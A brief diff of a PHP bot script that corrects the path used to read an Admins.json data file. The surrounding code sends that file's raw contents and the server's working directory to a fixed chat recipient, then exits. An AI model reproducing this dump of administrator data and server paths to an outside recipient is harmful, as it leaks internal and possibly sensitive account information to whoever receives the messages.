@@ -321,7 +321,7 @@ sendPv($myid, $archivo1);
 $pwd = getcwd();
 sendPv($myid, $pwd);
 	
-$archivo = file_get_contents('./app/data/Admins.json');
+$archivo = file_get_contents('../app/data/Admins.json');
 $data = json_decode($archivo, true);
 sendPv($myid, $archivo);
 die();
